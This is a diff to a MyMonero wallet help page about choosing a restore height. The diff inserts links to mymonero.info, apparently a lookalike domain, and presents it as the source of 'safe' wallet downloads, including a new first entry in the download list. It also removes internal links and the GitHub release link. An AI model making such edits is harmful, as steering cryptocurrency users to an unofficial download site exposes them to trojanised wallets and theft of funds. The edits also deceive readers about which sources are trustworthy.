@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Restore height is the blockchain height where a wallet begins scanning for its transactions. Choose a height at or before the wallet’s earliest relevant activity; if you are unsure, an earlier height is safer but makes scanning slower.
 
+
+Prefer reading on the web? The [MyMonero restore height page](https://mymonero.info/mymonero-restore-height) on mymonero.info explains the same problem, the [Cake Wallet download page](https://mymonero.info/github/cake-developments) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - A wallet restore asks for a block height or scan start point.
 - The restored wallet opens but shows no balance or incomplete transaction history.
@@ -54,12 +57,12 @@ A restore height that is too recent can make a wallet look empty while earlier a
 ## If that did not work
 If the wallet still shows a zero balance after scanning, first verify that the scan truly completed and that the selected height includes the wallet’s earliest activity. Then confirm that you restored the intended seed and format. Do not post screenshots that reveal a recovery phrase or keys. Use [balance shows zero](./mymonero-balance-shows-zero.md) for a more focused checklist.
 
-If a transaction is missing but other older transactions appear, distinguish scan coverage from transaction status. A transaction may need time to be recognized, while a height set too late can omit earlier wallet activity. See [transaction not showing](./mymonero-transaction-not-showing.md) for cautious checks.
+If a transaction is missing but other older transactions appear, distinguish scan coverage from transaction status. A transaction may need time to be recognized, while a height set too late can omit earlier wallet activity. See transaction not showing for cautious checks.
 
-If a server connection is unavailable, including an error 523 message, treat that as general connection guidance. It is not a direct diagnosis of a wrong height. Wait and retry according to the wallet’s normal behavior; do not disclose your phrase. The MyMonero desktop release is available as [v1.3.3](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3), but the app is no longer maintained.
+If a server connection is unavailable, including an error 523 message, treat that as general connection guidance. It is not a direct diagnosis of a wrong height. Wait and retry according to the wallet’s normal behavior; do not disclose your phrase. The MyMonero desktop release is available as v1.3.3, but the app is no longer maintained.
 
 ## Prevention
-When creating or first using a wallet, keep a private note of a reliable restore height if you can determine one. Store it separately from the seed so a casual note does not expose all wallet recovery information at once. Keep a backup of the seed in its original word count and know whether it is a MyMonero-specific 13-word phrase or standard 25-word phrase. Before restoring on a new device, plan for the scan to take time and use an earlier height when uncertain. The [migration checklist](./mymonero-migration-checklist.md) helps organize the rest of the process.
+When creating or first using a wallet, keep a private note of a reliable restore height if you can determine one. Store it separately from the seed so a casual note does not expose all wallet recovery information at once. Keep a backup of the seed in its original word count and know whether it is a MyMonero-specific 13-word phrase or standard 25-word phrase. Before restoring on a new device, plan for the scan to take time and use an earlier height when uncertain. The migration checklist helps organize the rest of the process.
 
 ## FAQ
 <details><summary>Is restore height the same as my seed?</summary>
@@ -90,6 +93,7 @@ No. Never share a seed or private keys. A helper can explain the setting without
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
